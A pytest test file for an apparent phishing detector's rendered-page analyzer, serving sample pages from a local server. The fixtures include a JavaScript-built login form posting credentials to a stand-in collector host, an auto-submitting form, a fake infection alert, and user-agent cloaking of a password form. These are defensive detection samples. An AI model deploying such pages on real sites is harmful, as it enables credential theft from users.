"""Dynamic (rendered-page) analysis against a local test server. Skipped without Playwright/Chromium."""
import asyncio
import http.server
import threading

import pytest

from phishguard import browser_analyzer as B

PAGES = {
    "/jslogin": b"<html><head><title>Account</title></head><body><div id=a></div><script>"
                b"document.getElementById('a').innerHTML='<form action=\"https://collector.example.net/p\" method=post>"
                b"<input name=u><input type=password name=p></form>';</script></body></html>",
    "/autosubmit": b"<html><body><form method=post action=/x><input name=a></form>"
                   b"<script>document.forms[0].submit()</script></body></html>",
    "/dialog": b"<html><body><script>alert('Your PC is infected')</script>hello</body></html>",
    "/target": b"<html><head><title>Landed</title></head><body>ok</body></html>",
    "/plain": b"<html><head><title>Hello</title></head><body><p>just text</p></body></html>",
}


class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        ua = self.headers.get("User-Agent", "")
        if self.path == "/hop":
            self.send_response(301); self.send_header("Location", "/target"); self.send_header("Content-Length", "0")
            self.end_headers(); return
        if self.path == "/cloak":
            body = (b"<html><body><form method=post action=/x><input type=password name=p></form></body></html>"
                    if "Windows NT" in ua else b"<html><body>Under construction</body></html>")
        elif self.path in PAGES:
            body = PAGES[self.path]
        else:
            self.send_response(404); self.end_headers(); return
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


@pytest.fixture()
def site(monkeypatch):
    monkeypatch.setenv("PHISHGUARD_BROWSER", "auto")
    monkeypatch.setenv("PHISHGUARD_ALLOW_PRIVATE", "1")
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_port}"
    srv.shutdown()


def _run(coro_fn):
    async def go():
        try:
            return await coro_fn()
        finally:
            await B.close()
    return asyncio.run(go())


pytest.importorskip("playwright")


def _render_or_skip(url):
    r = _run(lambda: B.render(url))
    if not r.ok and r.error and "unavailable" in r.error:
        pytest.skip(r.error)
    return r


def test_plain_page_renders_with_preview(site):
    r = _render_or_skip(site + "/plain")
    assert r.ok and r.title == "Hello" and r.password_inputs == 0 and r.screenshot_b64


def test_js_built_login_form_is_seen_after_rendering(site):
    r = _render_or_skip(site + "/jslogin")
    assert r.ok and r.password_inputs == 1
    ids = {e.id for e in B.dynamic_evidence(r, "<html></html>", cloaked=False)}
    assert "js_built_login" in ids
    from phishguard.page_analyzer import analyze_page
    ev, _ = analyze_page(r.final_url, r.html, r.chain)
    assert any(e.id == "form_cross_domain" for e in ev)      # form target only exists in the rendered DOM


def test_auto_submitted_form_is_blocked_and_reported(site):
    r = _render_or_skip(site + "/autosubmit")
    assert r.post_attempts >= 1
    assert "auto_submit" in {e.id for e in B.dynamic_evidence(r, "", False)}


def test_dialog_on_load_is_dismissed_and_reported(site):
    r = _render_or_skip(site + "/dialog")
    assert r.ok and r.dialogs >= 1


def test_cloaking_is_detected(site):
    from phishguard import netguard
    scanner = asyncio.run(netguard.safe_fetch(site + "/cloak"))
    assert "password" not in scanner.html                      # scanner UA sees a harmless page
    r = _render_or_skip(site + "/cloak")
    assert r.password_inputs == 1
    cloaked = asyncio.run(B.cloaking_check(site + "/cloak", scanner.html, True))
    assert cloaked


def test_browser_cannot_reach_private_addresses_by_default(site, monkeypatch):
    monkeypatch.delenv("PHISHGUARD_ALLOW_PRIVATE")
    r = _render_or_skip(site + "/plain")
    assert not r.ok


def test_redirects_are_followed_not_left_on_the_browser_error_page(site):
    r = _render_or_skip(site + "/hop")
    assert r.ok and r.title == "Landed" and not r.final_url.startswith("chrome-error")
    assert [st for _, st in r.chain] == [301, 200]
